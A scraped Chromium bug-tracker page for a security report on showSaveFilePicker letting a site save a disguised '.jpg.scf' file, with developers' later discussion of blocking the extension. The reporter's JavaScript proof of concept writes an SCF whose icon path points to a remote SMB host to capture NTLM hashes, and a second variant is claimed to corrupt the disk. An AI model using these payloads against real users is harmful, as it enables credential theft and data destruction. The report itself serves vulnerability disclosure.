          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement. 
      <input id="checkbox" type="checkbox">

    Send email<chops-checkbox checked="true">Send email</chops-checkbox>
          <div class="input-grid">
            <label for="templateInput">Pick a template: </label>

      </dialog>

          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      <mr-click-throughs></mr-click-throughs>
      
        <div class="container-outside" id="issue">
          <aside class="metadata-container">
            <mr-issue-metadata></mr-issue-metadata>
          </aside>
          <div class="container-issue">
            <div class="issue-header-container">
              <mr-issue-header></mr-issue-header>

              <mr-migrated-banner hidden=""></mr-migrated-banner>

            <div class="container-issue-content">
              <mr-issue-details class="main-item"><!---->
      <style>
        mr-issue-details {
          font-size: var(--chops-main-font-size);

  </style>

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }

  :host {
    --mr-edit-field-padding: 0.125em 4px;

    background: none;

    text-decoration: underline;

    /* Links that look like buttons. */

    margin-left: auto;

  }

  }

    font-weight: bold;

              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->/<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->focus on the issue search field<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->c<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->compose a new issue<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->s<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->star the current issue<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->?<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->show this help dialog<!----></span>
              <!---->
            </div>
          <!---->
        </div>
        
          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.
        <p>
          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.
        </p>

      <div class="select-container">
        <i class="material-icons" role="presentation">arrow_drop_down</i>
        <select id="can" name="can" aria-label="Search scope">
          <optgroup label="Search within">
            <option value="1" selected="">All issues</option>
            <option value="2">Open issues</option>
            <option value="3">Open and owned by me</option>
            <option value="4">Open and reported by me</option>
            <option value="5">Open and starred by me</option>

          </optgroup>
          <optgroup label="My saved queries" hidden="">
            
            <option data-href="/u//queries">
              Manage my saved queries...
            </option>
          </optgroup>
        </select>
      </div>

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>

            Issue 1227995: Security: Ability to mask file type with another extention. IE JPEG
          <h1>
            
            Issue 1227995: Security: Ability to mask file type with another extention. IE JPEG
          </h1>
          
            Reported by
            
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>
      danie...@gmail.com<a id="user-link" href="/u/2813412164" title="danie...@gmail.com"><!---->danie...@gmail.com<!----></a>
      danie...@gmail.com<span id="user-text" hidden=""><!---->danie...@gmail.com<!----></span>

      Sat, Jul 10, 2021, 4:19 PM EDT

        Description #1 by danie...@gmail.com (Jul 10, 2021)
      <option value="0" selected="">
        Description #1 by danie...@gmail.com (Jul 10, 2021)
      </option>
    
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by danie...@gmail.com (Jul 10, 2021)
      </option>
    <!---->
        </select>
      <div class="select-container">
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by danie...@gmail.com (Jul 10, 2021)
      </option>
    <!---->
        </select>
      </div>
      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>A threat actor has the ability to mask a malicous file extention in the latest version of Google Chrome as another file extention. In my example, I was able to create a SFC file type masked as a jpg that points to my responder server. This allowed myself to be able to capture a users windows NTLM hash (test account) on the latest stable version of Google chrome without having to even opening the file. Everything points to this file being a jpg but it's automaticly sending data to the threat actor with no acknowledment of the user. <span class="line"><!---->A threat actor has the ability to mask a malicous file extention in the latest version of Google Chrome as another file extention. In my example, I was able to create a SFC file type masked as a jpg that points to my responder server. This allowed myself to be able to capture a users windows NTLM hash (test account) on the latest stable version of Google chrome without having to even opening the file. Everything points to this file being a jpg but it's automaticly sending data to the threat actor with no acknowledment of the user. <!----></span><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Chrome Version: 91.0.4472.124, stable<span class="line"><!---->Chrome Version: 91.0.4472.124, stable<!----></span><br>Operating System: Windows 10 20H2 build 19042.867<span class="line"><!---->Operating System: Windows 10 20H2 build 19042.867<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br>Attached is the video of the bug in use as well as the HTML webpage used to execute the bug. I've removed the IP in the HTML code.<span class="line"><!---->Attached is the video of the bug in use as well as the HTML webpage used to execute the bug. I've removed the IP in the HTML code.<!----></span><br><br>PoC:<span class="line"><!---->PoC:<!----></span><br>    <script><span class="line"><!---->    &lt;script&gt;<!----></span><br>        const butSaveNewFile = document.getElementById('addNewFile')<span class="line"><!---->        const butSaveNewFile = document.getElementById('addNewFile')<!----></span><br>        butSaveNewFile.addEventListener('mouseup', async () => {<span class="line"><!---->        butSaveNewFile.addEventListener('mouseup', async () =&gt; {<!----></span><br>            const options = {<span class="line"><!---->            const options = {<!----></span><br>                types: [<span class="line"><!---->                types: [<!----></span><br>                    {<span class="line"><!---->                    {<!----></span><br>                        description:<span class="line"><!---->                        description:<!----></span><br>                            'JPEG (*.jpg,*.jpeg,*.jpe,*.jiff)',<span class="line"><!---->                            'JPEG (*.jpg,*.jpeg,*.jpe,*.jiff)',<!----></span><br>                        accept: {<span class="line"><!---->                        accept: {<!----></span><br>                            'text/plain': ['.jpg.scf']<span class="line"><!---->                            'text/plain': ['.jpg.scf']<!----></span><br>                        }<span class="line"><!---->                        }<!----></span><br>                    }<span class="line"><!---->                    }<!----></span><br>                ],<span class="line"><!---->                ],<!----></span><br>                excludeAcceptAllOption: false<span class="line"><!---->                excludeAcceptAllOption: false<!----></span><br>            }<span class="line"><!---->            }<!----></span><br><br>            const handle = await window.showSaveFilePicker(options)<span class="line"><!---->            const handle = await window.showSaveFilePicker(options)<!----></span><br>            const writable = await handle.createWritable()<span class="line"><!---->            const writable = await handle.createWritable()<!----></span><br>            await writable.write('[Shell]\n')<span class="line"><!---->            await writable.write('[Shell]\n')<!----></span><br>            await writable.write('Command=2\n')<span class="line"><!---->            await writable.write('Command=2\n')<!----></span><br>            await writable.write('IconFile="//IPSanitized/frostb1te/poc.ico"')<span class="line"><!---->            await writable.write('IconFile="//IPSanitized/frostb1te/poc.ico"')<!----></span><br>            await writable.write('\n[Taskbar]\n')<span class="line"><!---->            await writable.write('\n[Taskbar]\n')<!----></span><br>            await writable.write('Command=ToggleDesktop\n')<span class="line"><!---->            await writable.write('Command=ToggleDesktop\n')<!----></span><br>            await writable.close()<span class="line"><!---->            await writable.close()<!----></span><br>        })                                                                                                                                                                                                                                                                                  <span class="line"><!---->        })                                                                                                                                                                                                                                                                                  <!----></span><br>    </script><span class="line"><!---->    &lt;/script&gt;<!----></span><br><br><br>CREDIT INFORMATION<b class="line"><!---->CREDIT INFORMATION<!----></b><br>Externally reported security bugs may appear in Chrome release notes. If<b class="line"><!---->Externally reported security bugs may appear in Chrome release notes. If<!----></b><br>this bug is included, how would you like to be credited?<b class="line"><!---->this bug is included, how would you like to be credited?<!----></b><br>Reporter credit: Daniel Rhea<span class="line"><!---->Reporter credit: Daniel Rhea<!----></span><mr-comment-content></mr-comment-content>

        This snippit will also cause a harddrive to corrupt <span class="line"><!---->This snippit will also cause a harddrive to corrupt <!----></span><br><br><br>            const writable = await handle.createWritable()<span class="line"><!---->            const writable = await handle.createWritable()<!----></span><br>            await writable.write('[Shell]\n')<span class="line"><!---->            await writable.write('[Shell]\n')<!----></span><br>            await writable.write('Command=2\n')<span class="line"><!---->            await writable.write('Command=2\n')<!----></span><br>            await writable.write('IconFile="C:\:$i30:$bitmap"')<span class="line"><!---->            await writable.write('IconFile="C:\:$i30:$bitmap"')<!----></span><br>            await writable.write('\n[Taskbar]\n')<span class="line"><!---->            await writable.write('\n[Taskbar]\n')<!----></span><br>            await writable.write('Command=ToggleDesktop\n')<span class="line"><!---->            await writable.write('Command=ToggleDesktop\n')<!----></span><br>            await writable.close()<span class="line"><!---->            await writable.close()<!----></span><br><br>A large threat for this is that the SCF file doesn't need to open to start it. Being in the same directory will cause it to trigger thus only requiring the user to save it, not even open it.<span class="line"><!---->A large threat for this is that the SCF file doesn't need to open to start it. Being in the same directory will cause it to trigger thus only requiring the user to save it, not even open it.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        I don't think the problem is that the user might not know what file extension a file gets (because what users really understand the difference between various extensions, especially if they've configured windows to hide file extensions by default). But the fact that we let you write .scf files does seem bad. I guess in the case of regular downloads this was "fixed" by adding a warning (<span class="line"><!---->I don't think the problem is that the user might not know what file extension a file gets (because what users really understand the difference between various extensions, especially if they've configured windows to hide file extensions by default). But the fact that we let you write .scf files does seem bad. I guess in the case of regular downloads this was "fixed" by adding a warning (<!----></span>issue 722524<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=722524" title="Downloaded .SCF file can leak credentials via SMB"><!---->issue 722524<!----></a>) when downloading such files, but here we don't really have that option.<span class="line"><!---->) when downloading such files, but here we don't really have that option.<!----></span><br><br>As such I think we should add .scf to the list of "bad" extensions in our copy of IsShellIntegratedExtension.<span class="line"><!---->As such I think we should add .scf to the list of "bad" extensions in our copy of IsShellIntegratedExtension.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>

        Issue 722524<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=722524" title="Downloaded .SCF file can leak credentials via SMB"><!---->Issue 722524<!----></a> <span class="line"><!----> <!----></span>also makes it sound like to actually exploit this you have to disable a bunch of default windows security features, so perhaps like that bug this should also be Security_Severity_Low?         This seems similar to <span class="line"><!---->This seems similar to <!----></span>Issue 1140417<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1140417" title="Security: showSaveFilePicker allowing to save .lnk and .local files on windows!"><!---->Issue 1140417<!----></a> <span class="line"><!----> <!----></span>(forked from <span class="line"><!---->(forked from <!----></span>Issue 1137247<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1137247" title="Security: Spoofing download filename extension in 86 chrome - showSaveFilePicker"><!---->Issue 1137247<!----></a>) where we blocked .lnk and .local. I think we should block .scf in the short term, while we figure out something better.<span class="line"><!---->) where we blocked .lnk and .local. I think we should block .scf in the short term, while we figure out something better.<!----></span><br><br>.scf seems to be used by some legitimate applications (DNA data?), so it'd be great to have a better long-term plan -- perhaps we can get away with blocking the more subtle extensions only when double-extensions (multiple dots in the extension) are used?<span class="line"><!---->.scf seems to be used by some legitimate applications (DNA data?), so it'd be great to have a better long-term plan -- perhaps we can get away with blocking the more subtle extensions only when double-extensions (multiple dots in the extension) are used?<!----></span><mr-comment-content></mr-comment-content>

        Yeah it appears the extension scf is used for DNA sequencing, and a couple Chromatogram applications and may cause conflicts if it was solely blocked. The double-extension .*.scf method would be a good resolution.<span class="line"><!---->Yeah it appears the extension scf is used for DNA sequencing, and a couple Chromatogram applications and may cause conflicts if it was solely blocked. The double-extension .*.scf method would be a good resolution.<!----></span><mr-comment-content></mr-comment-content>

        by

        by

      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1227995#c30">Comment 30<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Tue, Dec 7, 2021, 1:43 PM EST"></chops-timestamp>

        I had put together a CL (<span class="line"><!---->I had put together a CL (<!----></span>https://crrev.com/c/3089422<a class="undefined" target="_blank" href="https://crrev.com/c/3089422"><!---->https://crrev.com/c/3089422<!----></a>)<span class="line"><!---->)<!----></span> a while back blocking .scf files on Windows, but never landed it. It had some strange behavior because .scf files are not sanitized by net::GenerateFileName(), unlike .lnk and .local files. <span class="line"><!----> a while back blocking .scf files on Windows, but never landed it. It had some strange behavior because .scf files are not sanitized by net::GenerateFileName(), unlike .lnk and .local files. <!----></span><br><br>The current state of suggested name and extension sanitization is unnecessarily complicated, in my opinion. There are some odd discrepancies between how suggestedName and extensions are sanitize. For example. on non-Windows OSes, .local and .lnk extensions are stripped from the "accepts" list of extensions, but suggesting a file with a .local or .lnk extension is not sanitized. (we strip .local and .lnk extensions from "accepts" on all OSes, but net::GenerateFileName() only sanitizes these files on Windows.)<span class="line"><!---->The current state of suggested name and extension sanitization is unnecessarily complicated, in my opinion. There are some odd discrepancies between how suggestedName and extensions are sanitize. For example. on non-Windows OSes, .local and .lnk extensions are stripped from the "accepts" list of extensions, but suggesting a file with a .local or .lnk extension is not sanitized. (we strip .local and .lnk extensions from "accepts" on all OSes, but net::GenerateFileName() only sanitizes these files on Windows.)<!----></span><br><br>I touched up the CL to make this behavior more consistent (only strip .local and .lnk extensions from "accepts" on Windows) and to replace extensions ourselves to augment net::GenerateFileName() (we could consider changing this method, but that might have other side effects).<span class="line"><!---->I touched up the CL to make this behavior more consistent (only strip .local and .lnk extensions from "accepts" on Windows) and to replace extensions ourselves to augment net::GenerateFileName() (we could consider changing this method, but that might have other side effects).<!----></span><br><br>As written, it sanitizes both .scf and .*.scf files (only on Windows) but I'm happy to update this if we feel blocking non-compound extensions is not a good idea.<span class="line"><!---->As written, it sanitizes both .scf and .*.scf files (only on Windows) but I'm happy to update this if we feel blocking non-compound extensions is not a good idea.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

(<!----></span>@<span class="line"><!---->@<!----></span>google.com<a class="undefined" target="_blank" href="https://google.com"><!---->google.com<!----></a> only)<span class="line"><!----> only)<!----></span><br><br>To summarize, the chosen approach to address this bug is to add a prompt when saving a file with a dangerous extension. However, progress implementing the fix is slower than desired due to personnel changes. <span class="line"><!---->To summarize, the chosen approach to address this bug is to add a prompt when saving a file with a dangerous extension.
